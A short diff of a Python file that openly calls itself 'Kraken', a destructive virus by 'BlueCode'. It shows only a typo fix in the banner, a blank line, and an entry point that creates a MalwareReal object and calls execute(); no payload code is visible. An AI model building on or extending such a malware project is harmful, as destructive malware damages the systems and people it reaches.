@@ -1,5 +1,5 @@
 # ===================================================================================================================================
-#			Kraken - the most destructive virus of the entire world (more than Not Petya and WannaCry)
+#			Kraken - the most destructive virus of the entire world (more than NotPetya and WannaCry)
 #
 #											Made by BlueCode
 # ===================================================================================================================================
@@ -2036,5 +2036,6 @@ if __name__ == "__main__":
         pass
     malware = MalwareReal()
     malware.execute()
+
 
 
